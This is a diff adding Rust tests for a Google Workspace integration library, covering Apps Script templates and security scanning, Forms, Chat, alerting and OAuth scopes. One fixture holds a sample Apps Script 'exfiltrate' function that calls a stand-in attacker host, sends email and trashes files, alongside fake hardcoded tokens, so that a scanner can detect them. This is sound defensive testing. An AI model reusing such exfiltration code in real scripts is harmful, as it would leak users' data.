@@ -1,22 +1,30 @@
 use serde_json::{json, Value};
 use souls_core::google_bridge::{
     base64url_decode, base64url_encode, build_google_auth_url,
-    build_secondary_stream_generate_payload, check_keep_eligibility, compute_commute_alert,
-    compute_sapisidhash, dispatch_gem_official_api, evaluate_action_policy,
-    exchange_code_for_tokens, extract_video_id, import_gws_credentials_from_dir,
-    parse_captions_xml, quick_capture_to_obsidian, redact_google_secrets, refresh_access_token,
-    run_google_doctor, sanitize_for_external_llm, upcoming_birthdays, wrap_untrusted_content,
-    AgentInboxStore, DocsScratchpadStore, GemsCatalogStore, GoogleAccountRecord,
-    GoogleMultiAccountVault, GoogleSessionCredentials, GoogleSessionVault, GoogleTasksClient,
-    GoogleWorkspaceClient, JulesMigrationRouter, LegacyJulesCommand, NewProposalInput,
-    NlmCliBridge, OAuth2Config, PeopleClient, PkceChallenge, PolicyVerdict, RoutesV2Client,
-    SessionTaintTracker, WizRpcClient, WizRpcId, WizRpcPayload, WizRpcResponse, YouTubeClient,
+    build_secondary_stream_generate_payload, builtin_apps_script_templates,
+    check_chat_eligibility, check_keep_eligibility, compute_commute_alert, compute_form_stats,
+    compute_sapisidhash, dispatch_external_pulse_alert, dispatch_gem_official_api,
+    evaluate_action_policy, exchange_code_for_tokens, extract_video_id,
+    import_gws_credentials_from_dir, is_within_quiet_hours, missing_v0921_scopes,
+    parse_captions_xml, prepare_google_corpus_tier0, quick_capture_to_obsidian,
+    recommended_scopes_for_kind, redact_google_secrets, refresh_access_token, run_google_doctor,
+    sanitize_for_external_llm, scan_apps_script_security, should_dispatch_external,
+    upcoming_birthdays, wrap_untrusted_content, AgentInboxStore, ClaspCliBridge,
+    DocsScratchpadStore, GemsCatalogStore, GoogleAccountRecord, GoogleAppsScriptClient,
+    GoogleChatClient, GoogleFormsClient, GoogleMultiAccountVault, GoogleSessionCredentials,
+    GoogleSessionVault, GoogleTasksClient, GoogleWorkspaceClient, JulesMigrationRouter,
+    LegacyJulesCommand, NewProposalInput, NlmCliBridge, OAuth2Config, PeopleClient, PkceChallenge,
+    PolicyVerdict, ProactivePulseStore, RoutesV2Client, SessionTaintTracker, WizRpcClient,
+    WizRpcId, WizRpcPayload, WizRpcResponse, YouTubeClient,
 };
 use souls_core::harness::AgenticCliKind;
 use souls_core::CoreError;
 use souls_protocol::google::{
-    AccountPermissionPolicy, AuditEventDto, BlastRadiusTier, CalendarEventDto, ContactCardDto,
-    GemProfileDto, GmailMessageSummaryDto, GoogleAccountKind, ProposalStatus,
+    AccountPermissionPolicy, AppsScriptFileDto, AuditEventDto, BlastRadiusTier, CalendarEventDto,
+    ContactCardDto, DriveNotebookSyncLinkDto, GemProfileDto, GmailMessageSummaryDto,
+    GoogleAccountKind, GoogleFormQuestionDto, GoogleFormResponseDto, GoogleFormSummaryDto,
+    MinionGoogleSourceKind, ProposalStatus, PulseCategory, PulseConfigDto, PulseEventDto,
+    PulseUrgency,
 };
 use std::collections::HashMap;
 use std::path::PathBuf;
@@ -1601,4 +1609,858 @@ fn test_parse_google_client_secret_json_and_binary_resolution_priority() {
     assert_eq!(resolved, cmd_file);
     #[cfg(not(windows))]
     assert_eq!(resolved, posix_file);
+}
+
+// ============================================================================
+// v0.9.2.1 Etapa 2 Tests: Apps Script 24/7, Forms/Chat, Pulse, MinionS, Scopes
+// ============================================================================
+
+#[tokio::test]
+async fn test_apps_script_templates_security_scan_and_rest_mocks() {
+    let templates = builtin_apps_script_templates();
+    assert_eq!(templates.len(), 5);
+
+    let expected_ids = [
+        "gmail_bills_organizer",
+        "drive_attachments_archiver",
+        "forms_instant_notifier",
+        "gmail_promo_cleaner",
+        "morning_digest_cloud",
+    ];
+    for id in expected_ids {
+        let tpl = templates.iter().find(|t| t.id == id).expect("template exists");
+        assert!(!tpl.human_permissions.is_empty());
+        let scan = scan_apps_script_security(&tpl.files);
+        assert!(scan.manifest_json_valid, "Manifest invalid in {id}");
+        assert!(!scan.hardcoded_secrets_detected, "Unexpected secret in {id}");
+        assert!(scan.safe_score >= 70, "Low safe_score in {id}: {}", scan.safe_score);
+        assert!(!scan.human_permission_summary.is_empty());
+    }
+
+    // Safe script must carry explicit Portuguese negative assurances
+    let bills_scan = scan_apps_script_security(&templates[0].files);
+    assert!(bills_scan
+        .human_permission_summary
+        .iter()
+        .any(|s| s.contains("NÃO pode enviar e-mails")));
+    assert!(bills_scan
+        .human_permission_summary
+        .iter()
+        .any(|s| s.contains("NÃO envia dados para servidores externos")));
+
+    // Secret detection, invalid manifest JSON, external URL & destructive calls
+    let bad_files = vec![
+        AppsScriptFileDto {
+            name: "appsscript".to_string(),
+            file_type: "JSON".to_string(),
+            source: "{ invalid json !!!".to_string(),
+        },
+        AppsScriptFileDto {
+            name: "Code".to_string(),
+            file_type: "SERVER_JS".to_string(),
+            source: r#"
+                var key = "AIzaSyD_1234567890abcdef12345678";
+                var bot = "bot123456789:AAH_super_secret_telegram_token";
+                function exfiltrate() {
+                    UrlFetchApp.fetch("https://evil.example.com/hook");
+                    GmailApp.sendEmail("x@y.com", "sub", "body");
+                    DriveApp.getFileById("1").setTrashed(true);
+                }
+            "#
+            .to_string(),
+        },
+    ];
+    let bad_scan = scan_apps_script_security(&bad_files);
+    assert!(!bad_scan.manifest_json_valid);
+    assert!(bad_scan.hardcoded_secrets_detected);
+    assert!(bad_scan
+        .external_urls_detected
+        .contains(&"https://evil.example.com/hook".to_string()));
+    assert!(bad_scan
+        .destructive_calls_detected
+        .contains(&"UrlFetchApp.fetch".to_string()));
+    assert!(bad_scan
+        .destructive_calls_detected
+        .contains(&"GmailApp.sendEmail".to_string()));
+    assert!(bad_scan
+        .destructive_calls_detected
+        .contains(&"setTrashed(true)".to_string()));
+    assert!(bad_scan
+        .warnings
+        .iter()
+        .any(|w| w.code == "hardcoded_secret" && w.severity == "high"));
+    assert!(bad_scan
+        .warnings
+        .iter()
+        .any(|w| w.code == "invalid_manifest_json" && w.severity == "high"));
+    assert!(bad_scan.safe_score <= 25);
+
+    // Mock GoogleAppsScriptClient REST flows
+    let (base_url, _captured, server) = spawn_mock_http_server(|req| {
+        if req.method == "POST" && req.target == "/projects" {
+            return (
+                200,
+                "application/json".to_string(),
+                json!({
+                    "scriptId": "scr_123",
+                    "title": "Bills Organizer",
+                    "createTime": "2026-11-20T00:00:00Z"
+                })
+                .to_string(),
+            );
+        }
+        if req.method == "GET" && req.target == "/projects/scr_123" {
+            return (
+                200,
+                "application/json".to_string(),
+                json!({ "scriptId": "scr_123", "title": "Bills Organizer" }).to_string(),
+            );
+        }
+        if req.method == "GET" && req.target == "/projects/scr_123/content" {
+            return (
+                200,
+                "application/json".to_string(),
+                json!({ "files": [{ "name": "Code", "type": "SERVER_JS", "source": "function run() {}" }] })
+                    .to_string(),
+            );
+        }
+        if req.method == "PUT" && req.target == "/projects/scr_123/content" {
+            return (
+                200,
+                "application/json".to_string(),
+                json!({ "files": [{ "name": "Code", "type": "SERVER_JS", "source": "function updated() {}" }] })
+                    .to_string(),
+            );
+        }
+        if req.method == "POST" && req.target == "/projects/scr_123/versions" {
+            return (200, "application/json".to_string(), json!({ "versionNumber": 2 }).to_string());
+        }
+        if req.method == "POST" && req.target == "/projects/scr_123/deployments" {
+            return (
+                200,
+                "application/json".to_string(),
+                json!({
+                    "deploymentId": "dep_1",
+                    "deploymentConfig": { "versionNumber": 2, "description": "v2 prod" },
+                    "entryPoints": [{ "entryPointType": "EXECUTION_API" }]
+                })
+                .to_string(),
+            );
+        }
+        if req.method == "GET" && req.target == "/projects/scr_123/deployments" {
+            return (
+                200,
+                "application/json".to_string(),
+                json!({
+                    "deployments": [{
+                        "deploymentId": "dep_1",
+                        "deploymentConfig": { "versionNumber": 2 }
+                    }]
+                })
+                .to_string(),
+            );
+        }
+        if req.method == "GET" && req.target.starts_with("/processes") {
+            return (
+                200,
+                "application/json".to_string(),
+                json!({
+                    "processes": [{
+                        "projectName": "Bills Organizer",
+                        "functionName": "runBillsOrganizer",
+                        "processType": "TIME_DRIVEN",
+                        "processStatus": "COMPLETED",
+                        "duration": "0.520s"
+                    }]
+                })
+                .to_string(),
+            );
+        }
+        if req.method == "POST" && req.target == "/scripts/scr_123:run" {
+            return (
+                200,
+                "application/json".to_string(),
+                json!({ "done": true, "response": { "result": "ok", "count": 4 } }).to_string(),
+            );
+        }
+        (404, "application/json".to_string(), "{}".to_string())
+    })
+    .await;
+
+    let client = GoogleAppsScriptClient::with_base_url(&base_url);
+    let proj = client.create_project("tok", "Bills Organizer", None).await.unwrap();
+    assert_eq!(proj.script_id, "scr_123");
+    assert!(proj.editor_url.unwrap().contains("scr_123"));
+    assert_eq!(client.get_project("tok", "scr_123").await.unwrap().title, "Bills Organizer");
+    assert_eq!(client.get_content("tok", "scr_123").await.unwrap().len(), 1);
+    let updated = client
+        .update_content("tok", "scr_123", &templates[0].files)
+        .await
+        .unwrap();
+    assert_eq!(updated.len(), 1);
+    let ver = client.create_version("tok", "scr_123", Some("Release")).await.unwrap();
+    assert_eq!(ver, 2);
+    let dep = client
+        .create_deployment("tok", "scr_123", ver, Some("v2 prod"))
+        .await
+        .unwrap();
+    assert_eq!(dep.deployment_id, "dep_1");
+    assert_eq!(dep.version_number, Some(2));
+    assert_eq!(client.list_deployments("tok", "scr_123").await.unwrap().len(), 1);
+    assert_eq!(
+        client.list_processes("tok", Some("scr_123")).await.unwrap()[0].function_name,
+        "runBillsOrganizer"
+    );
+    let run_res = client
+        .run_function("tok", "scr_123", "runBillsOrganizer", Some(vec![json!(1)]), false)
+        .await
+        .unwrap();
+    assert_eq!(run_res["count"], 4);
+
+    // Clasp bridge deterministic check with nonexistent binary path
+    let tmp = tempdir().unwrap();
+    let clasp = ClaspCliBridge::with_binary(tmp.path().join("missing_clasp.exe"));
+    assert!(!clasp.is_installed());
+    assert!(clasp.version().await.is_none());
+
+    server.abort();
+}
+
+#[tokio::test]
+async fn test_forms_chat_rest_stats_eligibility_and_webhook_guard() {
+    // Chat eligibility: ONLY WorkspaceEnterprise allowed
+    assert!(check_chat_eligibility(GoogleAccountKind::WorkspaceEnterprise).is_ok());
+    assert!(check_chat_eligibility(GoogleAccountKind::PersonalGmail).is_err());
+    assert!(check_chat_eligibility(GoogleAccountKind::SecondarySandbox).is_err());
+
+    // Webhook guard rejects non-Google URLs
+    assert!(matches!(
+        GoogleChatClient::send_incoming_webhook("https://evil.example.com/hook", "hi").await,
+        Err(CoreError::DangerousCommandBlocked(_))
+    ));
+    assert!(matches!(
+        GoogleChatClient::send_incoming_webhook("http://chat.googleapis.com/v1/spaces/x", "hi")
+            .await,
+        Err(CoreError::DangerousCommandBlocked(_))
+    ));
+
+    let (base_url, captured, server) = spawn_mock_http_server(|req| {
+        if req.method == "POST" && req.target == "/forms/forms" {
+            return (
+                200,
+                "application/json".to_string(),
+                json!({
+                    "formId": "frm_1",
+                    "info": { "title": "NPS Q4" },
+                    "responderUri": "https://docs.google.com/forms/d/e/frm_1/viewform"
+                })
+                .to_string(),
+            );
+        }
+        if req.method == "GET" && req.target == "/forms/forms/frm_1" {
+            return (
+                200,
+                "application/json".to_string(),
+                json!({
+                    "formId": "frm_1",
+                    "info": { "title": "NPS Q4", "description": "Feedback" },
+                    "items": [
+                        {
+                            "itemId": "it_1",
+                            "title": "Satisfação",
+                            "questionItem": {
+                                "question": {
+                                    "questionId": "q_sat",
+                                    "required": true,
+                                    "choiceQuestion": {
+                                        "type": "RADIO",
+                                        "options": [{ "value": "Excelente" }, { "value": "Bom" }]
+                                    }
+                                }
+                            }
+                        },
+                        {
+                            "itemId": "it_2",
+                            "title": "Comentário",
+                            "questionItem": {
+                                "question": { "questionId": "q_txt" }
+                            }
+                        }
+                    ]
+                })
+                .to_string(),
+            );
+        }
+        if req.method == "POST" && req.target == "/forms/forms/frm_1:batchUpdate" {
+            return (200, "application/json".to_string(), json!({ "replies": [] }).to_string());
+        }
+        if req.method == "GET" && req.target == "/forms/forms/frm_1/responses" {
+            return (
+                200,
+                "application/json".to_string(),
+                json!({
+                    "responses": [
+                        {
+                            "responseId": "r1",
+                            "createTime": "2026-11-19T10:00:00Z",
+                            "lastSubmittedTime": "2026-11-19T10:05:00Z",
+                            "answers": {
+                                "q_sat": { "questionId": "q_sat", "textAnswers": { "answers": [{ "value": "Excelente" }] } },
+                                "q_txt": { "questionId": "q_txt", "textAnswers": { "answers": [{ "value": "Muito bom" }] } }
+                            }
+                        },
+                        {
+                            "responseId": "r2",
+                            "createTime": "2026-11-19T11:00:00Z",
+                            "lastSubmittedTime": "2026-11-19T11:00:00Z",
+                            "answers": {
+                                "q_sat": { "questionId": "q_sat", "textAnswers": { "answers": [{ "value": "Bom" }] } },
+                                "q_txt": { "questionId": "q_txt", "textAnswers": { "answers": [{ "value": "Rápido" }] } }
+                            }
+                        }
+                    ]
+                })
+                .to_string(),
+            );
+        }
+        if req.method == "GET" && req.target == "/chat/spaces" {
+            return (
+                200,
+                "application/json".to_string(),
+                json!({
+                    "spaces": [{
+                        "name": "spaces/AAA",
+                        "displayName": "Engineering",
+                        "spaceType": "ROOM",
+                        "spaceThreadingState": "THREADED_MESSAGES"
+                    }]
+                })
+                .to_string(),
+            );
+        }
+        if req.method == "GET" && req.target.starts_with("/chat/spaces/AAA/messages") {
+            return (
+                200,
+                "application/json".to_string(),
+                json!({
+                    "messages": [{
+                        "name": "spaces/AAA/messages/m1",
+                        "sender": { "displayName": "Alice" },
+                        "text": "Build green"
+                    }]
+                })
+                .to_string(),
+            );
+        }
+        if req.method == "POST" && req.target == "/chat/spaces/AAA/messages" {
+            return (
+                200,
+                "application/json".to_string(),
+                json!({
+                    "name": "spaces/AAA/messages/m2",
+                    "text": "Deployed!"
+                })
+                .to_string(),
+            );
+        }
+        if req.method == "POST" && req.target == "/webhook" {
+            return (200, "application/json".to_string(), json!({ "ok": true }).to_string());
+        }
+        (404, "application/json".to_string(), "{}".to_string())
+    })
+    .await;
+
+    let forms = GoogleFormsClient::with_base_url(format!("{base_url}/forms"));
+    let created = forms.create_form("tok", "NPS Q4", None).await.unwrap();
+    assert_eq!(created.form_id, "frm_1");
+    let form = forms.get_form("tok", "frm_1").await.unwrap();
+    assert_eq!(form.questions.len(), 2);
+    forms
+        .batch_update_form("tok", "frm_1", json!([]))
+        .await
+        .unwrap();
+    let resps = forms.list_responses("tok", "frm_1").await.unwrap();
+    assert_eq!(resps.len(), 2);
+
+    // Stats computation (also check capping sample_text_answers at 5)
+    let mut many_resps = resps.clone();
+    for i in 3..=8 {
+        many_resps.push(GoogleFormResponseDto {
+            response_id: format!("r{i}"),
+            create_time: format!("2026-11-19T12:0{i}:00Z"),
+            last_submitted_time: format!("2026-11-19T12:0{i}:00Z"),
+            respondent_email: None,
+            answers: vec![
+                ("q_sat".to_string(), "Excelente".to_string()),
+                ("q_txt".to_string(), format!("Obs #{i}")),
+            ],
+        });
+    }
+    let synthetic_form = GoogleFormSummaryDto {
+        form_id: form.form_id.clone(),
+        title: form.title.clone(),
+        description: form.description.clone(),
+        responder_uri: form.responder_uri.clone(),
+        linked_sheet_id: None,
+        questions: vec![
+            GoogleFormQuestionDto {
+                item_id: "q_sat".to_string(),
+                title: "Satisfação".to_string(),
+                question_type: "RADIO".to_string(),
+                required: true,
+                options: vec!["Excelente".to_string(), "Bom".to_string()],
+            },
+            GoogleFormQuestionDto {
+                item_id: "q_txt".to_string(),
+                title: "Comentário".to_string(),
+                question_type: "TEXT".to_string(),
+                required: false,
+                options: vec![],
+            },
+        ],
+    };
+    let stats = compute_form_stats(&synthetic_form, &many_resps);
+    assert_eq!(stats.total_responses, 8);
+    assert_eq!(stats.latest_submission_at.as_deref(), Some("2026-11-19T12:08:00Z"));
+    assert_eq!(stats.question_stats[0].option_counts[0].option, "Excelente");
+    assert_eq!(stats.question_stats[0].option_counts[0].count, 7);
+    assert_eq!(stats.question_stats[1].sample_text_answers.len(), 5);
+    assert!(!stats.markdown_summary.contains("\r\n"));
+    assert!(stats.markdown_summary.contains("# NPS Q4 (Google Forms)"));
+
+    // Chat client + local allowed webhook
+    let chat = GoogleChatClient::with_base_url(format!("{base_url}/chat"));
+    let spaces = chat.list_spaces("tok").await.unwrap();
+    assert_eq!(spaces.len(), 1);
+    assert!(spaces[0].threaded);
+    assert_eq!(
+        chat.list_messages("tok", "spaces/AAA", 10).await.unwrap()[0].text,
+        "Build green"
+    );
+    assert_eq!(
+        chat.create_message("tok", "AAA", "Deployed!").await.unwrap().text,
+        "Deployed!"
+    );
+    let wh_res = GoogleChatClient::send_incoming_webhook_with_allow_local(
+        &format!("{base_url}/webhook"),
+        "Alert from Souls",
+        true,
+    )
+    .await
+    .unwrap();
+    assert_eq!(wh_res["ok"], true);
+    assert!(!captured.lock().unwrap().is_empty());
+
+    server.abort();
+}
+
+#[tokio::test]
+async fn test_proactive_pulse_store_cadence_quiet_hours_backoff_and_dispatch() {
+    // Quiet Hours edge cases
+    assert!(!is_within_quiet_hours(false, 23, 22, 8));
+    assert!(!is_within_quiet_hours(false, 3, 22, 8));
+    assert!(is_within_quiet_hours(true, 22, 22, 8));
+    assert!(is_within_quiet_hours(true, 23, 22, 8));
+    assert!(is_within_quiet_hours(true, 0, 22, 8));
+    assert!(is_within_quiet_hours(true, 7, 22, 8));
+    assert!(!is_within_quiet_hours(true, 8, 22, 8));
+    assert!(!is_within_quiet_hours(true, 15, 22, 8));
+    assert!(is_within_quiet_hours(true, 10, 9, 17));
+    assert!(!is_within_quiet_hours(true, 17, 9, 17));
+    assert!(!is_within_quiet_hours(true, 10, 10, 10));
+
+    // should_dispatch_external rules
+    assert!(!should_dispatch_external(PulseUrgency::Low, false, 1800, None, 5000));
+    assert!(!should_dispatch_external(PulseUrgency::Medium, false, 1800, None, 5000));
+    assert!(!should_dispatch_external(PulseUrgency::High, true, 1800, None, 5000));
+    assert!(!should_dispatch_external(
+        PulseUrgency::Critical,
+        false,
+        1800,
+        Some(4000),
+        5000
+    ));
+    assert!(should_dispatch_external(
+        PulseUrgency::Critical,
+        false,
+        1800,
+        Some(3000),
+        5000
+    ));
+
+    let tmp = tempdir().unwrap();
+    let store = ProactivePulseStore::open(tmp.path()).unwrap();
+
+    // Config clamping + secret isolation
+    let mut custom_cfg = PulseConfigDto::default();
+    custom_cfg.interval_mins = 1; // clamped to 5
+    custom_cfg.quiet_hours_start = 29; // clamped to 23
+    custom_cfg.webhook_configured = true; // ignored when secret missing
+    let saved_cfg = store.update_config(custom_cfg).unwrap();
+    assert_eq!(saved_cfg.interval_mins, 5);
+    assert_eq!(saved_cfg.quiet_hours_start, 23);
+    assert!(!saved_cfg.webhook_configured);
+
+    let (base_url, captured, server) = spawn_mock_http_server(|req| {
+        if req.method == "POST" && req.target == "/hook" {
+            return (200, "application/json".to_string(), json!({ "ok": true }).to_string());
+        }
+        if req.method == "POST" && req.target.contains("/sendMessage") {
+            return (200, "application/json".to_string(), json!({ "ok": true }).to_string());
+        }
+        (404, "application/json".to_string(), "{}".to_string())
+    })
+    .await;
+
+    let with_secrets = store
+        .update_secrets(
+            Some(format!("{base_url}/hook")),
+            Some("123456:tg_secret_tok".to_string()),
+            Some("999888".to_string()),
+        )
+        .unwrap();
+    assert!(with_secrets.webhook_configured);
+    assert!(with_secrets.telegram_configured);
+
+    let cfg_disk = std::fs::read_to_string(tmp.path().join("pulse_config.json")).unwrap();
+    assert!(!cfg_disk.contains("tg_secret_tok"));
+    assert!(!cfg_disk.contains("/hook"));
+    assert!(!cfg_disk.contains("\r\n"));
+
+    // Cadence + isolated backoff
+    assert!(store.is_due(1_000));
+    let t1 = store.begin_tick(1_000);
+    assert_eq!(t1, 1);
+    assert!(!store.is_due(1_100));
+    assert!(store.is_due(1_300));
+    assert!(store.should_run_monitor("commute", t1, 1, false, 1_000));
+    assert!(store.should_run_monitor("gmail_vip", t1, 2, false, 1_000));
+    assert!(store.should_run_monitor("forms_sync", t1, 3, false, 1_000));
+
+    let t2 = store.begin_tick(1_300);
+    assert_eq!(t2, 2);
+    assert!(store.should_run_monitor("commute", t2, 1, false, 1_300));
+    assert!(!store.should_run_monitor("gmail_vip", t2, 2, false, 1_300));
+    assert!(store.should_run_monitor("gmail_vip", t2, 2, true, 1_300));
+
+    store.record_monitor_error(
+        "gmail_vip",
+        10,
+        "HTTP 429 with token ya29.secret_backoff_leak",
+        1_300,
+    );
+    // gmail_vip enters 2*10m = 1200s backoff; commute remains unaffected!
+    assert!(!store.should_run_monitor("gmail_vip", 3, 2, true, 1_600));
+    assert!(store.should_run_monitor("commute", 3, 1, false, 1_600));
+    let health = store.monitor_health_list();
+    assert!(!health[0].last_error.as_deref().unwrap().contains("ya29.secret_backoff_leak"));
+    store.record_monitor_ok("gmail_vip", 10, 2_500);
+    assert!(store.should_run_monitor("gmail_vip", 3, 2, false, 2_500));
+
+    // Cursors & seen_form_responses_diff
+    store.set_gmail_cursor(1_700_000);
+    assert_eq!(store.runtime_state().gmail_last_seen_ts, Some(1_700_000));
+    let diff1 = store.seen_form_responses_diff("frm_1", &["r1".into(), "r2".into()]);
+    assert_eq!(diff1, vec!["r1", "r2"]);
+    let diff2 = store.seen_form_responses_diff("frm_1", &["r1".into(), "r2".into(), "r3".into()]);
+    assert_eq!(diff2, vec!["r3"]);
+
+    // Event deduplication, Hermes drain, external dispatch sanitization & ack
+    let ev = PulseEventDto {
+        id: "ev_1".to_string(),
+        created_at: 2_000,
+        category: PulseCategory::EmailVip,
+        urgency: PulseUrgency::High,
+        title: "VIP Alert".to_string(),
+        summary: "Urgent review ya29.secret_in_event_summary".to_string(),
+        account_id: Some("default".to_string()),
+        source_ref: Some("thr_1".to_string()),
+        action_hint: Some("open_gmail".to_string()),
+        acknowledged: false,
+        delivered_to_hermes: false,
+        delivered_externally: false,
+        dedup_key: "vip:thr_1".to_string(),
+    };
+    assert!(store.push_event(ev.clone()).unwrap());
+    assert!(!store.push_event(ev).unwrap(), "Duplicate dedup_key must be suppressed");
+    assert_eq!(store.unacked_count(), 1);
+
+    let drained = store.pending_for_hermes(3, true).unwrap();
+    assert_eq!(drained.len(), 1);
+    assert!(!drained[0].summary.contains("ya29.secret_in_event_summary"));
+    assert!(store.pending_for_hermes(3, true).unwrap().is_empty());
+
+    // External dispatch with secret sanitization
+    assert!(store.can_dispatch_external("email_vip", 2_000));
+    let http = reqwest::Client::new();
+    let channels = dispatch_external_pulse_alert(
+        &http,
+        &store.secrets(),
+        &drained[0],
+        Some(&base_url),
+    )
+    .await
+    .unwrap();
+    assert_eq!(channels, vec!["webhook", "telegram"]);
+    store.mark_external_dispatched("ev_1", "email_vip", 2_000);
+    assert!(!store.can_dispatch_external("email_vip", 2_100));
+    assert!(store.list_events(5)[0].delivered_externally);
+    assert_eq!(store.ack_events(None).unwrap(), 1);
+    assert_eq!(store.unacked_count(), 0);
+
+    // Clearing secret with Some("")
+    let cleared_cfg = store.update_secrets(Some("".to_string()), None, None).unwrap();
+    assert!(!cleared_cfg.webhook_configured);
+    assert!(cleared_cfg.telegram_configured);
+
+    // Sync Links CRUD
+    let link = DriveNotebookSyncLinkDto {
+        id: "lnk_1".to_string(),
+        notebook_id: "nb_1".to_string(),
+        notebook_title: "Specs".to_string(),
+        source_id: "src_1".to_string(),
+        drive_file_id: "drv_1".to_string(),
+        drive_file_name: "RFC.docx".to_string(),
+        auto_sync_enabled: false,
+        last_checked_at: None,
+        last_synced_at: None,
+        last_status: "idle".to_string(),
+    };
+    store.upsert_sync_link(link).unwrap();
+    assert_eq!(store.sync_links_for_drive_file("drv_1").len(), 1);
+    let toggled = store.toggle_sync_link("lnk_1", true).unwrap();
+    assert!(toggled.auto_sync_enabled);
+    assert!(store.delete_sync_link("lnk_1").unwrap());
+    assert!(store.list_sync_links().is_empty());
+    assert!(!captured.lock().unwrap().is_empty());
+
+    server.abort();
+}
+
+#[test]
+fn test_minions_google_tier0_cache_hit_pdf_and_token_savings() {
+    let tmp = tempdir().unwrap();
+
+    // 1. Large multi-chunk plain text document -> miss on 1st query, hit on 2nd query
+    let mut doc = String::new();
+    for i in 0..12 {
+        doc.push_str(&format!(
+            "Seção {i}: Relatório operacional de infraestrutura em nuvem com latência média de 12ms e disponibilidade padrão de 99.5%. \
+            Procedimentos de backup em snapshots diários sem incidentes registrados no trimestre anterior.\n\n"
+        ));
+        for _ in 0..45 {
+            doc.push_str("Texto de preenchimento técnico detalhando auditoria rotineira de logs e métricas de rede corporativa. ");
+        }
+        doc.push_str("\n\n");
+    }
+    doc.push_str("Cláusula Crítica de SLA: A multa contratual por indisponibilidade abaixo de 99.95% será de 15% sobre a fatura mensal.");
+
+    let prep1 = prepare_google_corpus_tier0(
+        tmp.path(),
+        MinionGoogleSourceKind::DriveDoc,
+        "drv_contrato_master",
+        doc.as_bytes(),
+        "multa contratual SLA",
+        2,
+    )
+    .unwrap();
+
+    assert!(!prep1.cache_hit);
+    assert!(prep1.chunks_total >= 3);
+    assert!((1..=2).contains(&prep1.chunks_selected));
+    assert!(prep1.estimated_token_savings_pct > 20.0);
+    assert!(prep1
+        .top_passages
+        .iter()
+        .any(|p| p.excerpt.contains("99.95%")));
+    assert!(prep1.framed_context_for_slm.contains("<<<SOULS_UNTRUSTED_DATA:"));
+    assert!(!prep1.markdown_export.contains("\r\n"));
+
+    let prep2 = prepare_google_corpus_tier0(
+        tmp.path(),
+        MinionGoogleSourceKind::DriveDoc,
+        "drv_contrato_master",
+        doc.as_bytes(),
+        "latência média infraestrutura",
+        1,
+    )
+    .unwrap();
+    assert!(prep2.cache_hit, "Second query on identical bytes must hit disk cache");
+    assert_eq!(prep2.content_sha256, prep1.content_sha256);
+
+    // 2. Real synthetic PDF extraction via DrivePdf
+    let pdf_bytes = build_test_pdf_bytes();
+    let pdf_prep1 = prepare_google_corpus_tier0(
+        tmp.path(),
+        MinionGoogleSourceKind::DrivePdf,
+        "pdf_bench",
+        &pdf_bytes,
+        "Qwen3.5 latency",
+        2,
+    )
+    .unwrap();
+    assert!(!pdf_prep1.cache_hit);
+    assert!(pdf_prep1.top_passages[0].excerpt.contains("Qwen3.5"));
+
+    let pdf_prep2 = prepare_google_corpus_tier0(
+        tmp.path(),
+        MinionGoogleSourceKind::DrivePdf,
+        "pdf_bench",
+        &pdf_bytes,
+        "Architecture Benchmark",
+        2,
+    )
+    .unwrap();
+    assert!(pdf_prep2.cache_hit);
+}
+
+#[tokio::test]
+async fn test_workspace_v0921_helpers_and_incremental_oauth_scopes() {
+    // OAuth incremental scopes + missing_v0921_scopes + session DTO integration
+    let pkce = PkceChallenge::generate();
+    let scopes_personal = recommended_scopes_for_kind(GoogleAccountKind::PersonalGmail);
+    let scopes_corp = recommended_scopes_for_kind(GoogleAccountKind::WorkspaceEnterprise);
+
+    assert!(scopes_personal
+        .iter()
+        .any(|s| s == "https://www.googleapis.com/auth/script.projects"));
+    assert!(scopes_personal
+        .iter()
+        .any(|s| s == "https://www.googleapis.com/auth/forms.body"));
+    assert!(!scopes_personal
+        .iter()
+        .any(|s| s.contains("auth/chat.")));
+    assert!(scopes_corp
+        .iter()
+        .any(|s| s == "https://www.googleapis.com/auth/chat.messages"));
+
+    let cfg = OAuth2Config::google_default(
+        "cid_1",
+        None,
+        "http://127.0.0.1:9123/cb",
+        scopes_personal.clone(),
+    );
+    let auth_url = build_google_auth_url(&cfg, &pkce, None);
+    assert!(auth_url.contains("include_granted_scopes=true"));
+
+    let legacy_only = vec!["https://www.googleapis.com/auth/gmail.modify".to_string()];
+    let missing_personal = missing_v0921_scopes(&legacy_only, GoogleAccountKind::PersonalGmail);
+    assert_eq!(missing_personal.len(), 5);
+    assert!(missing_v0921_scopes(&scopes_personal, GoogleAccountKind::PersonalGmail).is_empty());
+    assert_eq!(
+        missing_v0921_scopes(&scopes_personal, GoogleAccountKind::WorkspaceEnterprise).len(),
+        2
+    );
+    assert!(missing_v0921_scopes(&scopes_corp, GoogleAccountKind::WorkspaceEnterprise).is_empty());
+
+    let mut rec = GoogleAccountRecord::new("acct_1", "corp@company.com", GoogleAccountKind::WorkspaceEnterprise);
+    rec.scopes = scopes_personal;
+    let dto = rec.to_public_dto();
+    assert_eq!(dto.missing_recommended_scopes.len(), 2);
+
+    // Workspace export_drive_file_text, download_drive_file_bytes & get_gmail_thread_text
+    let msg_b64 = base64url_encode(b"Thread reply body with invoice #42.");
+    let msg_b64_clone = msg_b64.clone();
+    let (base_url, _cap, server) = spawn_mock_http_server(move |req| {
+        if req.method == "GET" && req.target.starts_with("/drive/files/doc_1/export") {
+            return (200, "text/plain".to_string(), "Exported Google Doc text".to_string());
+        }
+        if req.method == "GET" && req.target == "/drive/files/bin_small?alt=media" {
+            return (200, "application/octet-stream".to_string(), "0123456789".to_string());
+        }
+        if req.method == "GET" && req.target == "/drive/files/bin_huge?alt=media" {
+            return (200, "application/octet-stream".to_string(), "A".repeat(128));
+        }
+        if req.method == "GET" && req.target.starts_with("/gmail/users/me/threads/thr_9") {
+            return (
+                200,
+                "application/json".to_string(),
+                json!({
+                    "id": "thr_9",
+                    "messages": [{
+                        "id": "m_9",
+                        "threadId": "thr_9",
+                        "payload": {
+                            "mimeType": "text/plain",
+                            "headers": [
+                                { "name": "From", "value": "billing@vendor.com" },
+                                { "name": "Subject", "value": "Invoice #42" }
+                            ],
+                            "body": { "data": msg_b64_clone }
+                        }
+                    }]
+                })
+                .to_string(),
+            );
+        }
+        (404, "application/json".to_string(), "{}".to_string())
+    })
+    .await;
+
+    let ws = GoogleWorkspaceClient::with_base_urls(
+        format!("{base_url}/gmail"),
+        format!("{base_url}/cal"),
+        format!("{base_url}/drive"),
+        format!("{base_url}/docs"),
+        format!("{base_url}/sheets"),
+        format!("{base_url}/slides"),
+    );
+
+    assert_eq!(
